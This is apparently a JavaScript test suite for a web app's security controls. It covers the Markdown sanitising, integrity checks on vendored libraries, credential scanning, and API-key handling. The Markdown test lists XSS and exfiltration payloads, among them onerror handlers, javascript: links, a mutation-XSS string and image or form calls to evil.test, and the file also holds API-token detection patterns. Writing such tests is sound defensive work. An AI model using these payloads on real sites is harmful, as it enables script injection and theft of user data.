import test from 'node:test';
import assert from 'node:assert/strict';
import {createRequire} from 'node:module';
const {JSDOM}=createRequire(new URL('../backend/package.json',import.meta.url))('jsdom');
import {readFileSync} from 'node:fs';
import {execFileSync} from 'node:child_process';
import {createHash} from 'node:crypto';
import {configureMarkdown,modelBaseUrl,safeExternalUrl} from '../site/js/security.js';

const read=p=>readFileSync(new URL(p,import.meta.url),'utf8');
test('tracked source contains no credential files or recognizable API tokens',()=>{
 const root=new URL('../',import.meta.url);
 for(const file of execFileSync('git',['ls-files','-z'],{cwd:root,encoding:'utf8'}).split('\0').filter(Boolean)) {
  assert.ok(!/(^|\/)(\.env|\.dev\.vars)(\.|$)/.test(file),`Credential file tracked: ${file}`);
  const text=readFileSync(new URL(file,root),'utf8');
  assert.ok(!/\b(?:sk-[A-Za-z0-9_-]{25,}|ghp_[A-Za-z0-9]{25,}|gho_[A-Za-z0-9]{25,})/.test(text),`Possible credential in ${file}`);
 }
});
test('browser libraries are local and integrity hashes match the pinned bytes',()=>{
 const html=read('../site/index.html');
 assert.ok(!/<script[^>]+src=["']https?:/i.test(html));
 for(const item of JSON.parse(read('../site/vendor/manifest.json'))) {
  const bytes=readFileSync(new URL('../site/vendor/'+item.file,import.meta.url));
  assert.equal('sha384-'+createHash('sha384').update(bytes).digest('base64'),item.integrity);
  assert.ok(html.includes(`integrity="${item.integrity}"`));
 }
 assert.equal(read('../site/js/web-privacy.js'),read('../backend/lib/web-privacy.mjs'));
});
test('Markdown blocks scripts, external resources, forms, clobbering and dangerous links',()=>{
 const dom=new JSDOM('<!doctype html>',{url:'https://site.test/',runScripts:'outside-only'});
 dom.window.eval(read('../site/vendor/purify.min.js'));
 dom.window.eval(read('../site/vendor/marked.min.js'));
 const render=configureMarkdown(dom.window.DOMPurify,dom.window.marked,x=>x);
 const attacks=[
  '<img src="https://evil.test/secret" onerror="alert(1)">',
  '![leak](https://evil.test/collect?secret=PRIVATE)',
  '<svg><a xlink:href="javascript:alert(1)">x</a></svg>',
  '<math><mtext><table><mglyph><style><!--</style><img title="--><img src=x onerror=alert(1)>">',
  '<a href="javascript:alert(1)" ping="https://evil.test/log">click</a>',
  '<a href="data:text/html,private">data</a><a href="//evil.test">relative</a>',
  '<form action="https://evil.test"><input name="stepKey"></form>',
  '<div style="background:url(https://evil.test)"><iframe src="https://evil.test"></iframe></div>',
  '<a id="location" name="cookie" href="https://example.test/">safe</a>',
 ];
 for(const input of attacks){const wrap=dom.window.document.createElement('div');wrap.innerHTML=render(input);
  assert.equal(wrap.querySelector('img,svg,math,script,style,iframe,form,input,object,embed,video,audio,source,link,meta'),null);
  for(const el of wrap.querySelectorAll('*'))for(const attr of el.attributes){assert.ok(!/^(on|style$|id$|name$|src|ping$)/i.test(attr.name));if(attr.name==='href')assert.match(attr.value,/^(https:\/\/|#)/);}
 }
 assert.match(render('[source](https://example.test/)'),/noopener noreferrer/);
 assert.match(render('| a | b |\n|---|---|\n| 1 | 2 |'),/<table>/);
 dom.window.close();
});
test('only official encrypted model destinations can receive a personal key',()=>{
 assert.equal(modelBaseUrl('https://api.stepfun.com/step_plan/v1/'),'https://api.stepfun.com/step_plan/v1');
 for(const url of ['http://api.stepfun.com/v1','https://api.stepfun.com.evil.test/v1','https://user:pass@api.stepfun.com/v1','https://api.stepfun.com/v1?key=secret','https://evil.test/v1'])assert.throws(()=>modelBaseUrl(url));
 assert.equal(safeExternalUrl('javascript:alert(1)'),'');
});
test('conversation, keys and pending text never persist to browser storage',async()=>{
 const dom=new JSDOM('',{url:'https://site.test'});const keys=['ccf.session.v1','ccf.pending','ccf.set.stepKey','ccf.dashboard.v1'];
 for(const key of keys){dom.window.localStorage.setItem(key,'OLD_PRIVATE');dom.window.sessionStorage.setItem(key,'OLD_PRIVATE');}
 globalThis.localStorage=dom.window.localStorage;globalThis.sessionStorage=dom.window.sessionStorage;
 try {
  const {Settings,Pending}=await import('../site/js/store.js?privacy-test');
  const session=await import('../site/js/session.js?privacy-test');
  Settings.set('stepKey','NEW_PRIVATE_KEY');Pending.add({value:'PRIVATE_BODY'});session.writeSession({draft:'PRIVATE_DRAFT',turns:[{question:'PRIVATE_QUESTION'}]});
  assert.equal(Settings.get('stepKey'),'NEW_PRIVATE_KEY');assert.equal(session.readSession().draft,'PRIVATE_DRAFT');
  for(const storage of [globalThis.localStorage,globalThis.sessionStorage])assert.equal(storage.length,0);
  Settings.clear();session.clearSession();assert.equal(Settings.get('stepKey'),'');assert.deepEqual(session.readSession(),{});
 }finally{delete globalThis.localStorage;delete globalThis.sessionStorage;dom.window.close();}
});

test('personal keys go only to provider auth headers and never enter shared requests or error text',async()=>{
 const {Settings}=await import('../site/js/store.js?v=privacy-20261025');
 const {loadWiki}=await import('../site/js/data.js');
 const {ask}=await import('../site/js/agent.js');
 const original=globalThis.fetch;
 const secrets=['SYNTHETIC_PERSONAL_STEP','SYNTHETIC_PERSONAL_SEARCH'];
 const ui={signal:new AbortController().signal};
 try {
  globalThis.fetch=async()=>Response.json(JSON.parse(read('../site/data/wiki.json')));
  await loadWiki();
  Settings.set('mode','personal');Settings.set('stepKey',secrets[0]);Settings.set('deepseekKey',secrets[1]);
  Settings.set('allowWeb','false');
  let count=0;
  globalThis.fetch=async(url,options)=>{
   count++;
   assert.equal(url,'https://api.stepfun.com/step_plan/v1/chat/completions');
   assert.equal(options.headers.Authorization,'Bearer '+secrets[0]);
   assert.equal(options.redirect,'error');assert.equal(options.cache,'no-store');assert.equal(options.referrerPolicy,'no-referrer');
   for(const secret of secrets)assert.ok(!options.body.includes(secret));
   return new Response('data: '+JSON.stringify({choices:[{delta:{content:'公开会议资料'},finish_reason:'stop'}]})+'\n\ndata: [DONE]\n\n');
  };
  assert.equal((await ask([],'ICLR 截稿',ui)).text,'公开会议资料');assert.equal(count,1);
  globalThis.fetch=async()=>new Response(secrets.join(' '),{status:401});
  await assert.rejects(ask([],'ICLR 截稿',ui),e=>!secrets.some(s=>e.message.includes(s))&&e.message.includes('401'));
  Settings.set('mode','shared');
  globalThis.fetch=async(url,options)=>{
   assert.match(url,/^https:\/\/ccf2027-api-m24rjgc\.decent-hill-0315\.chatgpt\.site\/api\/ask$/);
   assert.equal(options.headers.Authorization,undefined);
   for(const secret of secrets)assert.ok(!JSON.stringify(options).includes(secret));
   assert.deepEqual(Object.keys(JSON.parse(options.body)).sort(),['allowWeb','effort','history','text']);
   return new Response('event: done\ndata: {"text":"完成","visited":[]}\n\n',{headers:{'Content-Type':'text/event-stream'}});
  };
  assert.equal((await ask([],'ICLR 截稿',ui)).text,'完成');
 } finally {globalThis.fetch=original;Settings.clear();}
});
